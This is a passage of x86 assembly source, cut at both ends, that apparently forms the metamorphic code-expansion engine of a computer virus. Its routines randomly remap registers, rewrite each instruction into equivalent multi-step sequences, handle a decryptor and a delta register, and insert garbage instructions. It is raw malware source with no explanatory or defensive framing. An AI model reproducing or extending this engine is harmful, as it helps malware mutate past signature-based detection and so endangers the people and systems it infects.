     @@XOR:     cmp     ebx, 30h  
                jz    @@XOR_XOR   
                jmp   @@NoCompression 

     @@MOV:     or      ebx, ebx  
                jz    @@MOV_ADD
                cmp     ebx, 8    
                jz    @@MOV_OR
                cmp     ebx, 20h  
                jz    @@MOV_AND
                cmp     ebx, 28h  
                jz    @@MOV_SUB
                cmp     ebx, 30h  
                jz    @@MOV_XOR
     @@NoCompression:
                mov     eax, 0FEh 
                ret
     @@Eliminate1st:
                mov     eax, 0FFh 
                ret               

     @@ADD_ADD:
     @@MOV_ADD: add     ecx, edx  
                ret
     @@OR_OR:                     
     @@MOV_OR:  or      ecx, edx
                ret
     @@AND_AND:                   
     @@MOV_AND: and     ecx, edx
                ret
     @@ADD_SUB:                   
     @@MOV_SUB: sub     ecx, edx  
                ret
     @@XOR_XOR:                   
     @@MOV_XOR: xor     ecx, edx
                ret
CalculateOperation endp


GetRealCheck    proc
                cmp     eax, ebx
                jb    @@1
                mov     ecx, ebx
                mov     edx, eax
                jmp   @@2
        @@1:    mov     ecx, eax
                mov     edx, ebx
        @@2:    test    ecx, 1    ; ECX <= EDX
                jnz   @@NoUnconditional
                sub     edx, 1    
                cmp     ecx, edx  
                jz    @@UnconditionalJump 
                add     edx, 1
        @@NoUnconditional:
                cmp     ecx, edx  
                jz    @@ReturnCurrent
                cmp     ecx, 2    
                jz    @@Check2_x
                cmp     ecx, 3    
                jz    @@Check3_x
                cmp     ecx, 4    
                jz    @@Check4_x
                cmp     ecx, 5    
                jnz   @@NoOption
       
       @@Check5_x:
                cmp     edx, 7    
                jz    @@SetNE     
                cmp     edx, 6    
                jz    @@UnconditionalJump 
                jmp   @@NoOption  
                                  
       
       @@Check2_x:
                cmp     edx, 4    
                jb    @@NoOption
                cmp     edx, 7    
                ja    @@NoOption
                test    edx, 1    
                jnz   @@SetNE
                jmp   @@SetBE     

       
       @@Check3_x:
                cmp     edx, 4    
                jz    @@SetNB
                cmp     edx, 7    
                jz    @@SetNB
                cmp     edx, 6    
                jz    @@UnconditionalJump
                jmp   @@NoOption  

       
       @@Check4_x:
                cmp     edx, 6    
                jz    @@SetBE
                cmp     edx, 7    
                jnz   @@NoOption
              

       @@SetNB: mov     eax, 3    
                ret
       @@SetNE: mov     eax, 5    
                ret
       @@SetBE: mov     eax, 6    
                ret
       @@NoOption:
                mov     eax, 0FFh 
       @@ReturnCurrent:
                ret
       @@UnconditionalJump:
                mov     eax, 79h  
                ret
GetRealCheck    endp


CheckIfInstructionUsesMem proc
                cmp     eax, 4Eh  
                jbe   @@Common
                cmp     eax, 4Fh  
                jz    @@UsesMem
                cmp     eax, 70h  
                jb    @@CheckLastBit
                cmp     eax, 80h  
                jb    @@NoMem
                cmp     eax, 0CEh
                jbe   @@Common
                cmp     eax, 0E7h 
                jbe   @@CheckLastBit
                cmp     eax, 0EAh 
                jz    @@UsesMem
                cmp     eax, 0EBh 
                jz    @@UsesMem
                cmp     eax, 0F1h 
                jz    @@UsesMem
                cmp     eax, 0F3h 
                jz    @@UsesMem
                cmp     eax, 0F6h 
                jz    @@UsesMem
                cmp     eax, 0F7h
                jz    @@UsesMem
                cmp     eax, 0F8h 
                jz    @@UsesMem
                cmp     eax, 0FCh 
                jz    @@UsesMem
       @@NoMem: xor     eax, eax  
                ret
       @@CheckLastBit:
                and     eax, 1    
                ret
       @@Common:
                cmp     eax, 4Eh  
                jz    @@UsesMem
                and     eax, 7
                cmp     eax, 2
                jb    @@NoMem
                cmp     eax, 4    
                ja    @@NoMem     
       @@UsesMem:
                mov     eax, 1
                ret
CheckIfInstructionUsesMem endp

;----------------------------------------------------------------------------------
XpandCode       proc
                mov     esi, [ebp+InstructionTable] 
                mov     edi, [ebp+ExpansionResult]  
    
                mov     eax, [ebp+SizeOfExpansion]
                mov     [ebp+Xp_RecurseLevel], eax                                                    

                mov     eax, [ebp+CreatingADecryptor] 
                or      eax, eax                      
                jnz   @@KeepRegisterTranslation 

                mov     eax, 8
                mov     [ebp+Xp_Register0], eax  
                mov     [ebp+Xp_Register1], eax
                mov     [ebp+Xp_Register2], eax
                mov     [ebp+Xp_Register3], eax
                mov     [ebp+Xp_Register5], eax
                mov     [ebp+Xp_Register6], eax
                mov     [ebp+Xp_Register7], eax
                mov     eax, 4
                mov     [ebp+Xp_Register4], eax  
    @@Other8BitsReg:
                call    Random
                and     eax, 7
                cmp     eax, 3                   
                ja    @@Other8BitsReg
                mov     ebx, [ebp+Register8Bits]  
                call    Xpand_SetRegister4Xlation 
    @@OtherDeltaReg:
                call    Random              
                and     eax, 7
                cmp     eax, 2              
                jbe   @@OtherDeltaReg       
                cmp     eax, 4              
                jz    @@OtherDeltaReg       
                mov     ebx, [ebp+DeltaRegister]
                call    Xpand_SetRegister4Xlation 
                or      eax, eax
                jz    @@OtherDeltaReg       
                mov     ebx, -1         
    @@NextRegister:
                add     ebx, 1
                cmp     ebx, [ebp+DeltaRegister] 
                jz    @@NextRegister
                cmp     ebx, [ebp+Register8Bits] 
                jz    @@NextRegister
                cmp     ebx, 4                   
                jz    @@NextRegister
                cmp     ebx, 8                   
                jz    @@EndOfRegisters
    @@OtherRegister:
                call    Random           
                and     eax, 7
                cmp     eax, 4
                jz    @@OtherRegister
                call    Xpand_SetRegister4Xlation 
                or      eax, eax
                jz    @@OtherRegister    
                jmp   @@NextRegister     
    @@EndOfRegisters:
                mov     eax, [ebp+DeltaRegister] 
                call    Xpand_TranslateRegister  
                mov     [ebp+TranslatedDeltaRegister], eax 
    @@KeepRegisterTranslation:

    @@Expand:  
                call    XpandThisInstruction  
                add     esi, 10h              
                cmp     esi, [ebp+AddressOfLastInstruction] 
                jnz   @@Expand                              
                mov     [ebp+AddressOfLastInstruction], edi
                call    Xpand_UpdateLabels    
                ret                           
XpandCode       endp


Xpand_TranslateRegister proc
                or      eax, eax  
                jz    @@Get0
                cmp     eax, 1
                jz    @@Get1
                cmp     eax, 2
                jz    @@Get2
                cmp     eax, 3
                jz    @@Get3
                cmp     eax, 4
                jz    @@Return    
                cmp     eax, 5
                jz    @@Get5
                cmp     eax, 6
                jz    @@Get6
                cmp     eax, 7
                jz    @@Get7
                mov     eax, 8  
                ret
      @@Get7:   mov     eax, [ebp+Xp_Register7]  
                ret                              
      @@Get0:   mov     eax, [ebp+Xp_Register0]
                ret
      @@Get1:   mov     eax, [ebp+Xp_Register1]
                ret
      @@Get2:   mov     eax, [ebp+Xp_Register2]
                ret
      @@Get3:   mov     eax, [ebp+Xp_Register3]
                ret
      @@Get5:   mov     eax, [ebp+Xp_Register5]
                ret
      @@Get6:   mov     eax, [ebp+Xp_Register6]
      @@Return: ret
Xpand_TranslateRegister endp

Xpand_ReverseTranslation proc
                cmp     eax, 4
                jz    @@Return        
                cmp     eax, [ebp+Xp_Register0] 
                jz    @@Return0
                cmp     eax, [ebp+Xp_Register1]
                jz    @@Return1
                cmp     eax, [ebp+Xp_Register2]
                jz    @@Return2
                cmp     eax, [ebp+Xp_Register3]
                jz    @@Return3
                cmp     eax, [ebp+Xp_Register5]
                jz    @@Return5
                cmp     eax, [ebp+Xp_Register6]
                jz    @@Return6
                cmp     eax, [ebp+Xp_Register7]
                jz    @@Return7
                mov     eax, 8
      @@Return: ret                     
     @@Return0: xor     eax, eax        
                ret                     
     @@Return1: mov     eax, 1
                ret
     @@Return2: mov     eax, 2
                ret
     @@Return3: mov     eax, 3
                ret
     @@Return5: mov     eax, 5
                ret
     @@Return6: mov     eax, 6
                ret
     @@Return7: mov     eax, 7
                ret
Xpand_ReverseTranslation endp

Xpand_SetRegister4Xlation proc
                cmp     eax, [ebp+Xp_Register0]  
                jz    @@ReturnError              
                cmp     eax, [ebp+Xp_Register1]  
                jz    @@ReturnError              
                cmp     eax, [ebp+Xp_Register2]
                jz    @@ReturnError              
                cmp     eax, [ebp+Xp_Register3]
                jz    @@ReturnError
                cmp     eax, [ebp+Xp_Register5]
                jz    @@ReturnError
                cmp     eax, [ebp+Xp_Register6]
                jz    @@ReturnError
                cmp     eax, [ebp+Xp_Register7]
                jz    @@ReturnError
                or      ebx, ebx    
                jz    @@SetAt0      
                cmp     ebx, 1      
                jz    @@SetAt1
                cmp     ebx, 2
                jz    @@SetAt2
                cmp     ebx, 3
                jz    @@SetAt3
                cmp     ebx, 5
                jz    @@SetAt5
                cmp     ebx, 6
                jz    @@SetAt6
    @@SetAt7:   mov     [ebp+Xp_Register7], eax  
                jmp   @@ReturnNoError            
    @@SetAt0:   mov     [ebp+Xp_Register0], eax
                jmp   @@ReturnNoError
    @@SetAt1:   mov     [ebp+Xp_Register1], eax
                jmp   @@ReturnNoError
    @@SetAt2:   mov     [ebp+Xp_Register2], eax
                jmp   @@ReturnNoError
    @@SetAt3:   mov     [ebp+Xp_Register3], eax
                jmp   @@ReturnNoError
    @@SetAt5:   mov     [ebp+Xp_Register5], eax
                jmp   @@ReturnNoError
    @@SetAt6:   mov     [ebp+Xp_Register6], eax
                jmp   @@ReturnNoError
    @@ReturnError:
                xor     eax, eax     
                ret
    @@ReturnNoError:
                mov     eax, 1       
                ret
Xpand_SetRegister4Xlation endp

XpandThisInstruction proc
                mov     eax, [esi+0Bh]  
                mov     [edi+0Bh], eax  
                mov     [edi+0Ch], esi  
                mov     [esi+0Ch], edi
                xor     eax, eax
                mov     al, [esi]       

                cmp     eax, 4Ch        
                ja    @@Xpand_Next001   
                xor     eax, eax
     @@Generic: mov     [ebp+Xp_8Bits], eax  
                mov     eax, [esi]
                and     eax, 78h             
                mov     [ebp+Xp_Operation], eax 
                mov     eax, [esi]           
                and     eax, 7
                or      eax, eax             
                jz    @@OPRegImm
                cmp     eax, 1               
                jz    @@OPRegReg
                cmp     eax, 2               
                jz    @@OPRegMem
                cmp     eax, 3               
                jz    @@OPMemReg
     @@OPMemImm:                             
                mov     eax, [ebp+Xp_8Bits]  
                or      eax, eax             
                jz    @@OPMemImm32
                mov     eax, [esi+7]         
                and     eax, 0FFh            
                cmp     eax, 7Fh
                jbe   @@OPMemImmSet
                or      eax, 0FFFFFF00h
                jmp   @@OPMemImmSet          
     @@OPMemImm32:
                mov     eax, [esi+7]         
     @@OPMemImmSet:
                mov     [ebp+Xp_Immediate], eax 
                call    Xpand_SetMemoryAddress  
                                             
                call    Xp_GenOPMemImm       
                jmp   @@Ret
     @@OPRegImm:
                mov     eax, [ebp+Xp_8Bits]  
                or      eax, eax             
                jz    @@OPRegImm32
                mov     eax, [esi+7]
                and     eax, 0FFh
                cmp     eax, 7Fh
                jbe   @@OPRegImmSet
                or      eax, 0FFFFFF00h
                jmp   @@OPRegImmSet
       @@OPRegImm32:
                mov     eax, [esi+7]
       @@OPRegImmSet:
                mov     [ebp+Xp_Immediate], eax  
                mov     eax, [esi+1]             
                and     eax, 0FFh
                call    Xpand_TranslateRegister  
                mov     [ebp+Xp_Register], eax   
                call    Xp_GenOPRegImm           
                jmp   @@Ret
     @@OPRegReg:
                mov     eax, [esi+1]             
                and     eax, 0FFh
                call    Xpand_TranslateRegister  
                mov     [ebp+Xp_SrcRegister], eax
                mov     eax, [esi+7]             
                and     eax, 0FFh
                call    Xpand_TranslateRegister  
                mov     [ebp+Xp_Register], eax
                call    Xp_GenOPRegReg           
                jmp   @@Ret
     @@OPRegMem:
                call    Xpand_SetMemoryAddress   
                mov     eax, [esi+7]             
                and     eax, 0FFh
                call    Xpand_TranslateRegister  
                mov     [ebp+Xp_Register], eax   
                call    Xp_GenOPRegMem           
                jmp   @@Ret
     @@OPMemReg:
                call    Xpand_SetMemoryAddress   
                mov     eax, [esi+7]             
                and     eax, 0FFh
                call    Xpand_TranslateRegister  
                mov     [ebp+Xp_Register], eax
                call    Xp_GenOPMemReg           
                jmp   @@Ret

   @@Xpand_Next001:
                cmp     eax, 00h+80h        
                jb    @@Xpand_Next002       
                cmp     eax, 4Ch+80h
                ja    @@Xpand_Next002
                mov     eax, 80h            
                jmp   @@Generic             
                                            

   @@Xpand_Next002:
                cmp     eax, 50h     
                jnz   @@Xpand_Next003
                mov     eax, [esi+1]            
                and     eax, 0FFh               
                call    Xpand_TranslateRegister 
                mov     [ebp+Xp_Register], eax
                call    Xp_GenPUSHReg           
                jmp   @@Ret

   @@Xpand_Next003:
                cmp     eax, 51h               
                jnz   @@Xpand_Next004
                call    Xpand_SetMemoryAddress 
                xor     eax, eax               
                mov     [ebp+Xp_8Bits], eax    
                call    Xp_GenPUSHMem          
                jmp   @@Ret

   @@Xpand_Next004:
                cmp     eax, 58h                
                jnz   @@Xpand_Next005
                mov     eax, [esi+1]            
                and     eax, 0FFh               
                call    Xpand_TranslateRegister 
                mov     [ebp+Xp_Register], eax
                call    Xp_GenPOPReg
                jmp   @@Ret

   @@Xpand_Next005:
                cmp     eax, 59h               
                jnz   @@Xpand_Next006
                call    Xpand_SetMemoryAddress 
                xor     eax, eax               
                mov     [ebp+Xp_8Bits], eax    
                call    Xp_GenPOPMem           
                jmp   @@Ret                    

   @@Xpand_Next006:
                cmp     eax, 68h               
                jnz   @@Xpand_Next007
                mov     eax, [esi+7]           
                mov     [ebp+Xp_Immediate], eax
                call    Xp_GenPUSHImm          
                jmp   @@Ret

   @@Xpand_Next007:
                cmp     eax, 70h               
                jb    @@Xpand_Next008
                cmp     eax, 7Fh
                ja    @@Xpand_Next008
                mov     [ebp+Xp_Operation], eax 
                mov     eax, [esi+1]            
                mov     [ebp+Xp_Immediate], eax 
                call    Xp_GenJcc               
                jmp   @@Ret

   @@Xpand_Next008:
                cmp     eax, 0E0h              
                jnz   @@Xpand_Next009
                call    Xpand_SetRegister      
                call    Xp_GenNOTReg           
                jmp   @@Ret                    

   @@Xpand_Next009:
                cmp     eax, 0E1h              
                jnz   @@Xpand_Next010
                call    Xpand_SetMemoryAddress 
                xor     eax, eax               
                mov     [ebp+Xp_8Bits], eax    
                call    Xp_GenNOTMem           
                jmp   @@Ret

   @@Xpand_Next010:
                cmp     eax, 0E2h              
                jnz   @@Xpand_Next011
                call    Xpand_Set8BitsRegister 
                call    Xp_GenNOTReg           
                jmp   @@Ret                    

   @@Xpand_Next011:
                cmp     eax, 0E3h              
                jnz   @@Xpand_Next012          
                call    Xpand_SetMemoryAddress
                mov     eax, 80h
                mov     [ebp+Xp_8Bits], eax
                call    Xp_GenNOTMem
                jmp   @@Ret

   @@Xpand_Next012:
                cmp     eax, 0E4h              
                jnz   @@Xpand_Next013
                call    Xpand_SetRegister      
                call    Xp_GenNEGReg           
                jmp   @@Ret

   @@Xpand_Next013:
                cmp     eax, 0E5h              
                jnz   @@Xpand_Next014
                call    Xpand_SetMemoryAddress 
                xor     eax, eax               
                mov     [ebp+Xp_8Bits], eax    
                call    Xp_GenNEGMem
                jmp   @@Ret

   @@Xpand_Next014:
                cmp     eax, 0E6h              
                jnz   @@Xpand_Next015
                call    Xpand_Set8BitsRegister 
                call    Xp_GenNEGReg           
                jmp   @@Ret                    

   @@Xpand_Next015:
                cmp     eax, 0E7h              
                jnz   @@Xpand_Next016
                call    Xpand_SetMemoryAddress 
                mov     eax, 80h               
                mov     [ebp+Xp_8Bits], eax    
                call    Xp_GenNEGMem
                jmp   @@Ret

   @@Xpand_Next016:
                cmp     eax, 0E8h              
                jnz   @@Xpand_Next017
   @@CopyInstruction:
                mov     eax, [esi]            
                mov     [edi], eax             
                mov     eax, [esi+4]           
                mov     [edi+4], eax
                mov     eax, [esi+7]
                mov     [edi+7], eax
                add     edi, 10h
                jmp   @@Ret

   @@Xpand_Next017:
                cmp     eax, 0E9h              
                jnz   @@Xpand_Next018
                mov     eax, [esi+1]           
                mov     [ebp+Xp_Immediate], eax 
                call    Xp_GenJMP               
                jmp   @@Ret

   @@Xpand_Next018:
                cmp     eax, 0EAh              
                jnz   @@Xpand_Next019
                xor     eax, eax               
                mov     [ebp+Xp_8Bits], eax
                call    Xpand_SetMemoryAddress 
                                               
                call    Xp_GenCALLMem          
                jmp   @@Ret

   @@Xpand_Next019:
                cmp     eax, 0EBh              
                jnz   @@Xpand_Next020
                xor     eax, eax
                mov     [ebp+Xp_8Bits], eax    
                call    Xpand_SetMemoryAddress 
                call    Xp_GenJMPMem           
                jmp   @@Ret

   @@Xpand_Next020:
                cmp     eax, 0ECh           
                jnz   @@Xpand_Next021
                xor     eax, eax            
                mov     [ebp+Xp_8Bits], eax
                call    Xpand_SetRegister   
                call    Xp_GenCALLReg       
                jmp   @@Ret

   @@Xpand_Next021:
                cmp     eax, 0EDh           
                jnz   @@Xpand_Next022
                xor     eax, eax            
                mov     [ebp+Xp_8Bits], eax
                call    Xpand_SetRegister   
                call    Xp_GenJMPReg        
                jmp   @@Ret

   @@Xpand_Next022:
                cmp     eax, 0F0h           
                jnz   @@Xpand_Next023
   @@Xpand_TranslateReg:
                mov     eax, [esi+1]        
                and     eax, 0FFh
                call    Xpand_TranslateRegister
                mov     [esi+1], eax        
                jmp   @@CopyInstruction     

   @@Xpand_Next023:
                cmp     eax, 0F2h           
                jz    @@Xpand_TranslateReg  

   @@Xpand_Next024:
                cmp     eax, 0F1h           
                jnz   @@Xpand_Next025
   @@Xpand_TranslateMem:
                call    Xpand_SetMemoryAddress 
                mov     eax, [esi]             
                mov     [edi], eax
                call    Xp_CopyMemoryReference
                mov     eax, [esi+7]
                mov     [edi+7], eax
                add     edi, 10h
                jmp   @@Ret

   @@Xpand_Next025:
                cmp     eax, 0F3h          
                jz    @@Xpand_TranslateMem 

   @@Xpand_Next026:
                cmp     eax, 0F4h          
                jnz   @@Xpand_Next027
                xor     eax, eax                
                mov     [ebp+Xp_8Bits], eax
                mov     [ebp+Xp_Register], eax  
                call    Xp_GenPUSHReg
                mov     eax, 1
                mov     [ebp+Xp_Register], eax  
                call    Xp_GenPUSHReg
                mov     eax, 2
                mov     [ebp+Xp_Register], eax  
                call    Xp_GenPUSHReg
                jmp   @@Ret

   @@Xpand_Next027:
                cmp     eax, 0F5h         
                jnz   @@Xpand_Next028
                xor     eax, eax                
                mov     [ebp+Xp_8Bits], eax
                mov     eax, 2
                mov     [ebp+Xp_Register], eax  
                call    Xp_GenPOPReg
                mov     eax, 1
                mov     [ebp+Xp_Register], eax  
                call    Xp_GenPOPReg
                xor     eax, eax
                mov     [ebp+Xp_Register], eax  
                call    Xp_GenPOPReg
                jmp   @@Ret

   @@Xpand_Next028:
                cmp     eax, 0F6h          
                jnz   @@Xpand_Next029_
                xor     eax, eax
                mov     [ebp+Xp_Register], eax 
                call    Xpand_SetMemoryAddress 
                mov     eax, 40h               
                mov     [ebp+Xp_Operation], eax
                xor     eax, eax
                mov     [ebp+Xp_8Bits], eax    
                call    Xp_GenOPMemReg         
                jmp   @@Ret

   @@Xpand_Next029_:
                cmp     eax, 0F8h          
                jnz   @@Xpand_Next029
                mov     eax, [esi+7]       
                and     eax, 0FFh
                call    Xpand_TranslateRegister
                mov     [ebp+Xp_Register], eax
                call    Xpand_SetMemoryAddress 
                call    Xp_GenMOVZX            
                jmp   @@Ret

   @@Xpand_Next029:
                cmp     eax, 0FCh          
                jnz   @@Xpand_Next030
                call    Xpand_SetMemoryAddress  
                mov     eax, [esi+7]            
                and     eax, 0FFh               
                call    Xpand_TranslateRegister 
                mov     [ebp+Xp_Register], eax  
                xor     eax, eax
                mov     [ebp+Xp_8Bits], eax
                call    Xp_GenLEA
                jmp   @@Ret

   @@Xpand_Next030:
                cmp     eax, 0FEh          
                jnz   @@Xpand_Next031
                call    Xp_GenRET          
                jmp   @@Ret

   @@Xpand_Next031:
                cmp     eax, 0FFh          
                jz    @@Return             

   @@Xpand_Next032:
                cmp     eax, 0F7h          
                jnz   @@Xpand_Next033

                call    Xpand_SetMemoryAddress
                xor     eax, eax
                mov     [ebp+Xp_8Bits], eax
                mov     eax, [esi+7]
                and     eax, 0FFh
                mov     [ebp+Xp_Immediate], eax
                mov     eax, [esi+8]
                and     eax, 0FFh
                call    Xpand_TranslateRegister
                mov     [ebp+Xp_Register], eax
                mov     eax, [esi+9]
                and     eax, 0FFh
                call    Xpand_TranslateRegister
                mov     [ebp+Xp_SrcRegister], eax
                call    Xp_MakeSET_WEIGHT

   @@Xpand_Next033:

   @@Ret:       call    Random             
                and     eax, 02h
                or      eax, eax
                jnz   @@Return
                mov     eax, [esi]         
                and     eax, 78h
                cmp     eax, 38h           
                jz    @@OnlyNOP            
                cmp     eax, 48h           
                jz    @@OnlyNOP            
                cmp     eax, 0EAh
                jz    @@OnlyNOP
                cmp     eax, 0F6h
                jz    @@OnlyNOP
                call    Xp_InsertGarbage   
   @@Return:    ret
   @@OnlyNOP:   mov     eax, 90FDh
                mov     [edi], eax         
                xor     eax, eax
                mov     [edi+0Bh], eax
                mov     [edi+0Ch], esi     
                add     edi, 10h
                ret
XpandThisInstruction endp

Xpand_SetMemoryAddress proc
                mov     eax, [esi+1]   
                and     eax, 0FFh
                cmp     eax, 9         
                jnz   @@Next_NoIdent   
                mov     eax, [esi+3]   
                mov     eax, [eax]     
                add     eax, [ebp+New_DATA_SECTION] 
                                           
                mov     [ebp+Xp_Mem_Addition], eax  
                mov     eax, [ebp+DeltaRegister]
                call    Xpand_TranslateRegister
                mov     [ebp+Xp_Mem_Index1], eax    
                mov     eax, 8
                mov     [ebp+Xp_Mem_Index2], eax    
                ret                            
     @@Next_NoIdent:
                mov     eax, [esi+1]      
                and     eax, 0FFh
                cmp     eax, 8            
                jae   @@Next_Index        
                call    Xpand_TranslateRegister  
     @@Next_Index:
                mov     [ebp+Xp_Mem_Index1], eax 
                mov     eax, [esi+2]
                mov     ecx, eax          
                and     ecx, 0C0h
                and     eax, 3Fh
                cmp     eax, 8            
                jae   @@Next_Index2       
                push    ecx
                call    Xpand_TranslateRegister
                pop     ecx               
                or      eax, ecx          
     @@Next_Index2:
                mov     [ebp+Xp_Mem_Index2], eax   
                mov     eax, [esi+3]               
                mov     [ebp+Xp_Mem_Addition], eax
                call    Random
                and     eax, 1
                jz    @@Return
                or      ecx, ecx          
                jnz   @@Return            
                mov     eax, [ebp+Xp_Mem_Index1] 
                mov     ecx, [ebp+Xp_Mem_Index2]
                mov     [ebp+Xp_Mem_Index1], ecx
                mov     [ebp+Xp_Mem_Index2], eax
     @@Return:  ret                              
Xpand_SetMemoryAddress endp


Xpand_UpdateLabels proc
                mov     ebx, [ebp+LabelTable]   
                mov     ecx, [ebp+NumberOfLabels]  

  @@LoopLabel:  mov     eax, [ebx]      
                mov     eax, [eax+0Ch]  
                mov     [ebx+4], eax    
                add     ebx, 8          
                sub     ecx, 1
                or      ecx, ecx        
                jnz   @@LoopLabel
                ret
Xpand_UpdateLabels endp

Xpand_Set8BitsRegister proc
                mov     eax, 80h             
                jmp     Xpand_SetRegister_Common
Xpand_Set8BitsRegister endp

Xpand_SetRegister proc
                xor     eax, eax             
Xpand_SetRegister_Common:
                mov     [ebp+Xp_8Bits], eax  
                mov     eax, [esi+1]
                and     eax, 0FFh            
                call    Xpand_TranslateRegister 
                mov     [ebp+Xp_Register], eax  
                ret
Xpand_SetRegister endp


Xp_GenLEA       proc
                call    Xp_SaveOperation         
                mov     eax, [ebp+Xp_Mem_Index1]
                cmp     eax, [ebp+Xp_Register]   
                jz    @@Addition1                
                mov     eax, [ebp+Xp_Mem_Index2]
                cmp     eax, [ebp+Xp_Register]  
                jz    @@Addition2               
                mov     eax, 40h
                mov     [ebp+Xp_Operation], eax  
       @@MOV_Other:
                call    Random
                and     eax, 3
                or      eax, eax
                jz    @@MOV_Other
                cmp     eax, 1
                jz    @@MOV_FirstIndex1   
                cmp     eax, 2
                jz    @@MOV_FirstIndex2   
       @@MOV_FirstAddition:               
                mov     eax, [ebp+Xp_Mem_Addition]
                or      eax, eax
                jz    @@MOV_Finished2     
                mov     [ebp+Xp_Immediate], eax
                call    Xp_GenOPRegImm     
                xor     eax, eax           
                mov     [ebp+Xp_Mem_Addition], eax
                jmp   @@MOV_Finished
       @@MOV_FirstIndex1:
                mov     eax, [ebp+Xp_Mem_Index1] 
                cmp     eax, 8                   
                jz    @@MOV_Finished2            
                mov     [ebp+Xp_SrcRegister], eax 
                call    Xp_GenOPRegReg            
                mov     eax, 8
                mov     [ebp+Xp_Mem_Index1], eax  
                jmp   @@MOV_Finished
       @@MOV_FirstIndex2:
                mov     eax, [ebp+Xp_Mem_Index2]  
                cmp     eax, 8                    
                jz    @@MOV_Finished2
                cmp     eax, 8                 
                jb    @@MOV_FirstIndex2_Set    
                sub     eax, 40h               
       @@MOV_FirstIndex2_Set:
                mov     [ebp+Xp_SrcRegister], eax 
                call    Xp_GenOPRegReg           
                mov     eax, [ebp+Xp_Mem_Index2]
                cmp     eax, 7                   
                jbe   @@MOV_FirstIndex2_Set8     
                sub     eax, 40h                 
                mov     [ebp+Xp_Mem_Index2], eax 
                jmp   @@MOV_Finished
       @@MOV_FirstIndex2_Set8:
                mov     eax, 8                   
                mov     [ebp+Xp_Mem_Index2], eax
       @@MOV_Finished:
                xor     eax, eax                 
                mov     [ebp+Xp_Operation], eax  
       @@MOV_Finished2:
                mov     eax, [ebp+Xp_Mem_Index1] 
                cmp     eax, 8                   
                jnz   @@MOV_Other                
                mov     eax, [ebp+Xp_Mem_Index2] 
                cmp     eax, 8                   
                jnz   @@MOV_Other                
                mov     eax, [ebp+Xp_Mem_Addition]
                or      eax, eax                 
                jnz   @@MOV_Other                
                call    Xp_RestoreOperation 
                ret                         
   @@Addition1: mov     eax, 8
                mov     [ebp+Xp_Mem_Index1], eax 
                jmp   @@MOV_Finished             
   @@Addition2: mov     eax, 8
                mov     [ebp+Xp_Mem_Index2], eax 
                jmp   @@MOV_Finished            
Xp_GenLEA       endp

Xp_GenOPRegReg  proc
                call    Xp_IncreaseRecurseLevel
                cmp     eax, 3          
                jae   @@Single          
                call    Random
                and     eax, 1
                jz    @@Single          
                call    Random
                and     eax, 3
                or      eax, eax        
                jnz   @@Double          
   @@Triple:    mov     eax, [ebp+Xp_Operation]
                cmp     eax, 38h        
                jae   @@Double
                call    Xp_SaveOperation
                call    Xp_GetTempVar    
                mov     eax, [ebp+Xp_Operation]
                push    eax
                mov     eax, 40h                
                mov     [ebp+Xp_Operation], eax
                call    Xp_GenOPMemReg          
                pop     eax
                mov     [ebp+Xp_Operation], eax 
                mov     eax, [ebp+Xp_Register]
                push    eax                     
                mov     eax, [ebp+Xp_SrcRegister] 
                mov     [ebp+Xp_Register], eax
                call    Xp_GenOPMemReg          
                pop     eax
                mov     [ebp+Xp_Register], eax  
                mov     eax, 40h
                mov     [ebp+Xp_Operation], eax 
                call    Xp_GenOPRegMem          
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel

   @@Double:    mov     eax, [ebp+Xp_Operation]
                cmp     eax, 40h                
                jz    @@Double_MOV
                cmp     eax, 38h                
                jz    @@Double_CMP
                cmp     eax, 48h                
                jz    @@Double_TEST
   @@Double_OP: call    Xp_SaveOperation
                call    Xp_GetTempVar           
                mov     eax, [ebp+Xp_Operation]
                push    eax
                mov     eax, 40h                
                mov     [ebp+Xp_Operation], eax
                mov     eax, [ebp+Xp_Register]
                push    eax
                mov     eax, [ebp+Xp_SrcRegister]
                mov     [ebp+Xp_Register], eax
                call    Xp_GenOPMemReg          
                pop     eax
                mov     [ebp+Xp_Register], eax  
                pop     eax
                mov     [ebp+Xp_Operation], eax 
                call    Xp_GenOPRegMem          
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel
   @@Double_MOV:
                call    Random
                and     eax, 1
                jz    @@Double_OP               
                mov     eax, [ebp+Xp_8Bits]
                or      eax, eax                
                jnz   @@Double_OP               
                mov     eax, [ebp+Xp_Register]
                push    eax                     
                mov     eax, [ebp+Xp_SrcRegister] 
                mov     [ebp+Xp_Register], eax    
                call    Xp_GenPUSHReg             
                pop     eax
                mov     [ebp+Xp_Register], eax    
                call    Xp_GenPOPReg              
                jmp     Xp_DecreaseRecurseLevel
   @@Double_CMP:
                mov     ecx, 3Bh          
                mov     edx, 2Bh          
   @@Double_CMPTEST_Common:
                call    Random
                and     eax, 1
                jz    @@Double_OP
                call    Xp_SaveOperation
                push    ecx
                push    edx
                call    Xp_GetTempVar     
                mov     eax, 40h
                mov     [ebp+Xp_Operation], eax
                call    Xp_GenOPMemReg    
                pop     edx
                pop     ecx
                call    Random
                and     eax, 1
                jz    @@Double_CMPTEST_Next 
                mov     edx, ecx
   @@Double_CMPTEST_Next:
                add     edx, [ebp+Xp_8Bits] 
                mov     [edi], edx                
                call    Xp_CopyMemoryReference    
                mov     eax, [ebp+Xp_SrcRegister] 
                mov     [edi+7], eax             
                add     edi, 10h                 
                jmp     Xp_RestoreOpAndDecreaseRecurseLevel
   @@Double_TEST:
                mov     ecx, 23h                 
                mov     edx, 4Bh                 
                jmp   @@Double_CMPTEST_Common    

   
   @@Single:    mov     eax, [ebp+Xp_Operation]  
                cmp     eax, 40h                 
                jz    @@Single_MOV
                or      eax, eax                 
                jz    @@Single_ADD
   @@Single_OP: mov     eax, [ebp+Xp_Operation]  
                add     eax, 1                   
                add     eax, [ebp+Xp_8Bits]      
                mov     [edi], eax               
                mov     eax, [ebp+Xp_Register]
                mov     [edi+7], eax             
                mov     eax, [ebp+Xp_SrcRegister]
                mov     [edi+1], eax             
                add     edi, 10h
                jmp     Xp_DecreaseRecurseLevel
   @@Single_MOV:
                mov     eax, [ebp+Xp_8Bits]      
                or      eax, eax                 
                jnz   @@Single_OP                
                call    Random
                and     eax, 1
                jz    @@Single_OP                
                mov     eax, 0FCh                
                mov     [edi], eax
                mov     eax, [ebp+Xp_Register]
                mov     [edi+7], eax
                mov     eax, [ebp+Xp_SrcRegister]
                mov     [edi+1], eax
                mov     eax, 8
                mov     [edi+2], eax
                xor     eax, eax
                mov     [edi+3], eax
                add     edi, 10h
                jmp     Xp_DecreaseRecurseLevel
   @@Single_ADD:
